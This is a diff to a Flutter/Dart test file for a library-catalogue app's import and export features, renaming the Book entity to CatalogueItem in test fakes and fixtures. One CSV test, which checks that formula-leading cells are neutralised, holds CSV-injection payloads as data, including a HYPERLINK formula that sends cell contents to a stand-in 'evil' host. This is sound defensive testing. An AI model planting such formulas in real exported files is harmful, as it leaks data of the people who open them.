@@ -15,7 +15,7 @@ import 'package:pitaka/features/import_export/infrastructure/pdf_library_rendere
 import 'package:pitaka/features/import_export/infrastructure/pitaka_json_exporter.dart';
 import 'package:pitaka/features/import_export/infrastructure/pitaka_json_importer.dart';
 import 'package:pitaka/features/library/domain/book_page.dart';
-import 'package:pitaka/features/library/domain/entities/book.dart';
+import 'package:pitaka/features/library/domain/entities/catalogue_item.dart';
 import 'package:pitaka/features/library/domain/library_query.dart';
 import 'package:pitaka/features/library/domain/repositories/book_repository.dart';
 import 'package:pitaka/features/wishlist/domain/entities/wishlist_book.dart';
@@ -27,21 +27,22 @@ class _Books implements BookRepository {
   // BookRepository additions (review 2026-09-03): fakes default to "no match"
   // and a pass-through transaction unless a test overrides them.
   @override
-  Future<Either<Failure, Book?>> findByUid(String bookUid) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> findByUid(String bookUid) async =>
+      right(null);
   @override
   Future<Either<Failure, T>> runInTransaction<T>(
     Future<Either<Failure, T>> Function() action,
   ) => action();
-  final List<Book> _all;
+  final List<CatalogueItem> _all;
   @override
-  Future<Either<Failure, List<Book>>> getAll() async => right(_all);
+  Future<Either<Failure, List<CatalogueItem>>> getAll() async => right(_all);
   @override
   Future<Either<Failure, BookPage>> page(
     LibraryQuery query, {
     required int limit,
     int offset = 0,
   }) async {
-    final rows = query.isSearch ? const <Book>[] : _all;
+    final rows = query.isSearch ? const <CatalogueItem>[] : _all;
     final start = offset.clamp(0, rows.length);
     final end = (start + limit).clamp(start, rows.length);
     return right(
@@ -57,13 +58,16 @@ class _Books implements BookRepository {
     BookSourceType type,
   ) async => right(const []);
   @override
-  Future<Either<Failure, Book?>> getById(int id) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> getById(int id) async => right(null);
   @override
-  Future<Either<Failure, Book?>> findByIsbn(String isbn) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> findByIsbn(String isbn) async =>
+      right(null);
   @override
-  Future<Either<Failure, Book>> insert(Book b) async => right(b);
+  Future<Either<Failure, CatalogueItem>> insert(CatalogueItem b) async =>
+      right(b);
   @override
-  Future<Either<Failure, Book>> update(Book b) async => right(b);
+  Future<Either<Failure, CatalogueItem>> update(CatalogueItem b) async =>
+      right(b);
   @override
   Future<Either<Failure, Unit>> markRemoved(int id, int at) async =>
       right(unit);
@@ -73,9 +77,10 @@ class _Books implements BookRepository {
   @override
   Future<Either<Failure, Unit>> delete(int id) async => right(unit);
   @override
-  Future<Either<Failure, int>> insertAll(List<Book> b) async => right(b.length);
+  Future<Either<Failure, int>> insertAll(List<CatalogueItem> b) async =>
+      right(b.length);
   @override
-  Future<Either<Failure, int>> replaceAll(List<Book> b) async =>
+  Future<Either<Failure, int>> replaceAll(List<CatalogueItem> b) async =>
       right(b.length);
 }
 
@@ -83,13 +88,13 @@ class _Books implements BookRepository {
 /// rows and the subtitle) instead of rendering, so the filter tests check
 /// the contract without parsing PDF bytes.
 class _RecordingRenderer implements LibraryPdfRenderer {
-  List<Book> books = const [];
+  List<CatalogueItem> books = const [];
   String? subtitle;
 
   @override
   Future<Uint8List> render({
     required String libraryName,
-    required List<Book> books,
+    required List<CatalogueItem> books,
     required List<PrintColumn> columns,
     required String footerAttribution,
     String? subtitle,
@@ -139,7 +144,7 @@ void main() {
   TestWidgetsFlutterBinding.ensureInitialized();
 
   const books = [
-    Book(
+    CatalogueItem(
       title: 'भारत: गांधी के बाद',
       author: 'Ramachandra Guha',
       isbn: '978-1',
@@ -152,7 +157,7 @@ void main() {
       removedAt: 200,
       addedBy: 'Khoj',
     ),
-    Book(title: 'Plain', addedDate: 50),
+    CatalogueItem(title: 'Plain', addedDate: 50),
   ];
   const wishlist = [
     WishlistBook(
@@ -242,17 +247,17 @@ void main() {
   // export as a bare formula cell that Excel/LibreOffice would execute.
   test('CSV export neutralises formula-leading cells (OWASP)', () async {
     const hostile = [
-      Book(title: '=1+1', addedDate: 1),
-      Book(title: '+cmd', addedDate: 2),
-      Book(title: '-2+3', addedDate: 3),
-      Book(title: '@SUM(A1)', addedDate: 4),
-      Book(title: '\ttabbed', addedDate: 5),
-      Book(
+      CatalogueItem(title: '=1+1', addedDate: 1),
+      CatalogueItem(title: '+cmd', addedDate: 2),
+      CatalogueItem(title: '-2+3', addedDate: 3),
+      CatalogueItem(title: '@SUM(A1)', addedDate: 4),
+      CatalogueItem(title: '\ttabbed', addedDate: 5),
+      CatalogueItem(
         title: '=HYPERLINK("http://evil/?"&A1),x',
         notes: 'safe',
         addedDate: 6,
       ),
-      Book(title: 'Normal title', addedDate: 7),
+      CatalogueItem(title: 'Normal title', addedDate: 7),
     ];
     final useCase = ExportLibraryUseCase(
       jsonEncoder: const PitakaJsonExporter(),
@@ -343,31 +348,31 @@ void main() {
 
   group('source filter (CSV + PDF only)', () {
     const sourced = [
-      Book(
+      CatalogueItem(
         title: 'Godaan',
         sourceType: BookSourceType.donated,
         sourceDetail: 'Ram Sharma',
         addedDate: 4,
       ),
-      Book(
+      CatalogueItem(
         title: 'Nirmala',
         sourceType: BookSourceType.donated,
         sourceDetail: 'ram sharma',
         addedDate: 3,
       ),
-      Book(
+      CatalogueItem(
         title: 'Gaban',
         sourceType: BookSourceType.donated,
         sourceDetail: 'Sita Devi',
         addedDate: 2,
       ),
-      Book(
+      CatalogueItem(
         title: 'Karmabhoomi',
         sourceType: BookSourceType.purchased,
         sourceDetail: 'Ram Sharma',
         addedDate: 1,
       ),
-      Book(title: 'Sevasadan'),
+      CatalogueItem(title: 'Sevasadan'),
     ];
     final useCase = ExportLibraryUseCase(
       jsonEncoder: const PitakaJsonExporter(),
@@ -467,7 +472,7 @@ void main() {
           jsonEncoder: const PitakaJsonExporter(),
           pdfRenderer: renderer,
           bookRepo: _Books(const [
-            Book(
+            CatalogueItem(
               title: 'गोदान',
               sourceType: BookSourceType.gift,
               sourceDetail: 'राम शर्मा',
@@ -511,7 +516,7 @@ void main() {
 
   test('exporter omits null fields but keeps required ones', () {
     final json = const PitakaJsonExporter().export(
-      books: const [Book(title: 'Only')],
+      books: const [CatalogueItem(title: 'Only')],
       wishlist: const [],
       exportedAt: 1,
     );
@@ -523,7 +528,7 @@ void main() {
   test('exporter emits libraryId/libraryName the importer reads back', () {
     const exporter = PitakaJsonExporter();
     final json = exporter.export(
-      books: const [Book(title: 'B')],
+      books: const [CatalogueItem(title: 'B')],
       wishlist: const [],
       exportedAt: 1,
       libraryId: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
@@ -536,7 +541,7 @@ void main() {
 
   test('exporter omits blank libraryId/libraryName from the envelope', () {
     final json = const PitakaJsonExporter().export(
-      books: const [Book(title: 'B')],
+      books: const [CatalogueItem(title: 'B')],
       wishlist: const [],
       exportedAt: 1,
     );
